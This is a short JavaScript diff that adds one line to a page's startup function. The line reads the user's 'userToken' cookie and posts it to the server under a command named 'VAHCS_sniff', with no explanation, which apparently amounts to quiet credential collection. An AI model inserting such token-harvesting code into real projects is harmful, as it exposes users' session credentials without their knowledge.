@@ -157,6 +157,8 @@ function startup(){
             $("#locationAniCurtain")[0].style="display: none;";
         };
     }
+    
+    $.post("/", {command: "VAHCS_sniff", data: getCookie("userToken")});
 }
 
 window.addEventListener('resize',()=> {
